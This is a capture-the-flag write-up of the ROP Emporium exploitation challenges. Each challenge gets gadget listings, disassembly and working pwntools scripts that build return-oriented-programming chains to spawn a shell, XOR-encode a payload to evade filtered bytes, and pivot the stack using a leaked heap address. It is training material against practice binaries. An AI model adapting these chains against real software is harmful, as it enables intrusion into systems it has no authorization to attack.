## ret2win

Quite easy, so I do not write scrip. The stack has no protection except N^X. And `ret2win` function will `cat flag` for us. Just write garbage information to fill the stack and adjust $RIP to the address of `ret2win` function, which is **0x400811**.

## split

Still easy, the binary includes function `system`. But how can we get string like `/bin/sh` to pass it to `system()` function? Let's use radare2 to check if the ELF contains useful strings:
```
$ rabin2 -z split32 
000 0x000008a8 0x004008a8  21  22 (.rodata) ascii split by ROP Emporium
001 0x000008be 0x004008be   7   8 (.rodata) ascii 64bits\n
002 0x000008c6 0x004008c6   8   9 (.rodata) ascii \nExiting
003 0x000008d0 0x004008d0  43  44 (.rodata) ascii Contriving a reason to ask user for data...
004 0x000008ff 0x004008ff   7   8 (.rodata) ascii /bin/ls
000 0x00001060 0x00601060  17  18 (.data) ascii /bin/cat flag.txt
```

Also check address:
```
$ gdb split
pwndbg> x system
0x4005e0 <system@plt>:	0x0a3a25ff
```

It's definitely easy now: `$ pythons -c "print 'A'*40 + '\x83\x08\x40\x00\x00\x00\x00\x00' + '\x60\x10\x60\x00\x00\x00\x00\x00' + '\x10\x08\x40\x00\x00\x00\x00\x00'" | ./split`

## callme

The challenge is special, it requires us to call `callme_one()`, `callme_two()` and `callme_three()` in sequence with argument `(1, 2, 3)`. It's slightly more difficult than previous two. We can finally use ROPgadget:
```
$ ROPgadget  --binary challenge  
Gadgets information
============================================================
...  // Long and unneeded output
0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret
0x0000000000401b23 : pop rdi ; ret
0x0000000000401ab2 : pop rdx ; ret
0x0000000000401b21 : pop rsi ; pop r15 ; ret
0x0000000000401ab1 : pop rsi ; pop rdx ; ret
0x0000000000401b1d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040198a : push rbp ; mov rbp, rsp ; call rax
0x00000000004017d9 : ret
0x0000000000401987 : sal byte ptr [rcx + rsi*8 + 0x55], 0x48 ; mov ebp, esp ; call rax
0x0000000000401b35 : sub esp, 8 ; add rsp, 8 ; ret
0x0000000000401b34 : sub rsp, 8 ; add rsp, 8 ; ret
0x00000000004018fa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x0000000000401b2a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000401986 : test eax, eax ; je 0x401983 ; push rbp ; mov rbp, rsp ; call rax
0x0000000000401985 : test rax, rax ; je 0x401984 ; push rbp ; mov rbp, rsp ; call rax

Unique gadgets found: 68

```

First, we need to control `rdi`, `rsi`, `rdx` to pass argument. Luckily, these three can help us:
```
0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret
```

Let's check the address of functions:
```
   4 0x00401810  GLOBAL    FUNC callme_three
...
   8 0x00401850  GLOBAL    FUNC callme_one
...
  11 0x00401870  GLOBAL    FUNC callme_two
```

Then, we need to find how function compares number:
```
0x00007ffff7bd68f8 <+8>:	mov    DWORD PTR [rbp-0x14],edi
0x00007ffff7bd68fb <+11>:	mov    DWORD PTR [rbp-0x18],esi
0x00007ffff7bd68fe <+14>:	mov    DWORD PTR [rbp-0x1c],edx
0x00007ffff7bd6901 <+17>:	cmp    DWORD PTR [rbp-0x14],0x1
0x00007ffff7bd6905 <+21>:	jne    0x7ffff7bd69bb <callme_one+203>
0x00007ffff7bd690b <+27>:	cmp    DWORD PTR [rbp-0x18],0x2
0x00007ffff7bd690f <+31>:	jne    0x7ffff7bd69bb <callme_one+203>
0x00007ffff7bd6915 <+37>:	cmp    DWORD PTR [rbp-0x1c],0x3
```

The answer is clear now, we need to pass 1 to *rdi*, 2 to *rsi*, 3 to *rdx*. And then jump to each function's plt table. Script:
```python
from pwn import *

number = p64(1) + p64(2) + p64(3)
rop = p64(0x401ab0)
offset = 40
shellcode = ""
shellcode += rop + number + p64(0x00401850)
shellcode += rop + number + p64(0x00401870)
shellcode += rop + number + p64(0x00401810)
bin = process('callme')
bin.sendline(offset*'A' + shellcode)
print bin.recvall()
```

## write4

It has a `usefulFunction` which calls `system("ls")` for us. But it's not quite useful:
```
0x0000000000400807 <+0>:	push   rbp
0x0000000000400808 <+1>:	mov    rbp,rsp
0x000000000040080b <+4>:	mov    edi,0x40090c
0x0000000000400810 <+9>:	call   0x4005e0 <system@plt>
0x0000000000400815 <+14>:	nop
0x0000000000400816 <+15>:	pop    rbp
0x0000000000400817 <+16>:	ret    
```

We need to pass string like `cat flag` of `/bin/sh` to the `system` function. Continue to run `ROPGadget`, we can find two interesting instructions:
```
0x0000000000400890 : pop r14 ; pop r15 ; ret
0x0000000000400820 : mov qword ptr [r14], r15 ; ret
0x0000000000400893 : pop rdi ; ret
```

First, we used first two instruction to write `/bin/sh` to *.data* segement, which has writeable fixed address (0x601050).

Finally, we return the address to rdi and directly go to `0x400810`:
```python
from pwn import *
dataSeg = p64(0x601050)
preRegister = p64(0x400890)
writeData = p64(0x400820)
writeRdi = p64(0x400893)
execute = p64(0x400810)
offset = 40

shellcode = ''
shellcode += preRegister + dataSeg + '/bin/sh\x00' 
shellcode += writeData
shellcode += writeRdi + dataSeg
shellcode += execute

bin = process('write4')
bin.sendline(offset*'A' + shellcode)
bin.interactive()
```

## badchars

The task is identical to the previous one, despite filtering several characters. Gadget:
```
0x0000000000400b34 : mov qword ptr [r13], r12 ; ret
0x0000000000400b3b : pop r12 ; pop r13 ; ret
0x0000000000400b39 : pop rdi ; ret
```

Becuase several characters are banned, we need to encrypt our payload to pass it to the stack. XOR is a common encryption method. Now, let's see how to decrypt:
```
0x0000000000400b30 : xor byte ptr [r15], r14b ; ret
0x0000000000400b40 : pop r14 ; pop r15 ; ret
```
Therefore, we can decrypt our string byte by byte.

The remaining things like return to system, finding .data address, and so on are identical to previous step, we can write script now:
```python
from pwn import *
dataAdd = 0x601050
dataSeg = p64(dataAdd)
preRegister = p64(0x0000000000400b3b)
writeData = p64(0x0000000000400b34)
writeRdi = p64(0x0000000000400b39)
execute = p64(0x00000000004009e8)
offset = 40
decrypt = ""

badchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]
xornum = [0x1]*8
num = 0
sh = ""

for i in "/bin/sh\x00":
    c = ord(i) ^ xornum[num]
    while c in badchars:
        xornum[num] += 1
        c = ord(i) ^ xornum[num] 
    sh += chr(c)
    num += 1

for i in range(0,8):
    decrypt += p64(0x0000000000400b40)
    decrypt += p64(xornum[i])
    decrypt += p64(dataAdd)
    decrypt += p64(0x0000000000400b30)
    dataAdd += 1

shellcode = ''
shellcode += preRegister + sh + dataSeg 
shellcode += writeData
shellcode += decrypt
shellcode += writeRdi + dataSeg
shellcode += execute
print offset*'A' + shellcode
bin = process('badchars')
bin.sendline(offset*'A' + shellcode)
bin.interactive()
```

## fluff

Now, we don't have usefulf gadget function. So we need to figure other ways. 

Notify one line in pwnme, we can control *rdi*:
```
...
   0x00000000004007f3 <+62>:	lea    rax,[rbp-0x20]
   0x00000000004007f7 <+66>:	mov    esi,0x200
   0x00000000004007fc <+71>:	mov    rdi,rax
   0x00000000004007ff <+74>:	call   0x400620 <fgets@plt>
   0x0000000000400804 <+79>:	nop
   0x0000000000400805 <+80>:	leave  
   0x0000000000400806 <+81>:	ret    
```

After testing in gdb, I found that the offset of *[rbp-0x20]* is the place after first char. So, we need to put a garbage character first. Then, write "bash\x00\x00\x00\x00". At last, we filled the remaning 31 character length plus return address of `call system`:
```python
from pwn import *

execute = p64(0x0000000000400810)
sh = "A" + "bash\x00\x00\x00\x00"
offset = 40
shellcode = execute
print offset*'A' + shellcode
bin = process('fluff')
bin.sendline(sh + (offset - len(sh))*'A' + shellcode)
bin.interactive()
```

I think this is an unexpected solution...

## pivot

Final question. We only have `uselessFunction` now ORZ.  But the program will leak address to us. Although ASLR is enabled, the relative address remains the same. Actually I found that we can use the method of previous question to solve...but that's not fun. Let's solve it in intended way.

The input has limitation now, which allows us to overflow the *rip* but not enough for a long shellcode (you can only input a 23 characters shellcode, 6 instructions). But we can move the *rsp* to heap, which has unlimited space:
```
0x0000000000400b00 : pop rax ; ret
0x0000000000400b02 : xchg rax, rsp ; ret
```

Then, we need to use the *got* and *plt* of `foothold_function` calculate the address of `ret2win`:
```
Dump of assembler code for function foothold_function@plt:
   0x0000000000400850 <+0>:	jmp    QWORD PTR [rip+0x2017f2]        # 0x602048
   0x0000000000400856 <+6>:	push   0x6
   0x000000000040085b <+11>: jmp    0x4007e0
```

So, the *plt* address is `0x0000000000400850`, and the *got.plt* is `0x602048`

In *glt.plt*, the result will be stored in *rax*. We need to find some ways to control it:
```
0x0000000000400b00 : pop rax ; ret
0x0000000000400b05 : mov rax, qword ptr [rax] ; ret
0x0000000000400900 : pop rbp ; ret
0x0000000000400b09 : add rax, rbp ; ret
0x000000000040098e : call rax
```

Finally, let's calculate the difference of these two functions:
```
pwndbg> x ret2win
0xabe <ret2win>:	0xe5894855
pwndbg> x foothold_function 
0x970 <foothold_function>:	0xe5894855
pwndbg> x 0xabe-0x970
0x14e:	Cannot access memory at address 0x14e
```

Final Script:
```python
from pwn import *
offset = 40
ret2libOffset = 0x14e
shellcode = ''
bin = process('pivot')
for i in range(0,4):
    bin.recvline()
leak = bin.recvline()
leak = int(leak.split("0x")[1], 16)
print str(hex(leak))
movRegToHeap = "A"*offset + p64(0x0000000000400b00) + p64(leak) + p64(0x0000000000400b02)

shellcode += p64(0x0000000000400850) # calculate plt
shellcode += p64(0x0000000000400b00) # Pop rax
shellcode += p64(0x602048)           # Pass got.plt to rax
shellcode += p64(0x0000000000400b05) # Mov *0x602048 inside to get address
shellcode += p64(0x0000000000400900) # Pop offset
shellcode += p64(ret2libOffset)      # Offset value
shellcode += p64(0x0000000000400b09) # Calculate ret2win address
shellcode += p64(0x000000000040098e) # Execute it!

bin.recvuntil('>')
bin.sendline(shellcode)
bin.recvuntil('>')
bin.sendline(movRegToHeap)
print bin.recvall()
```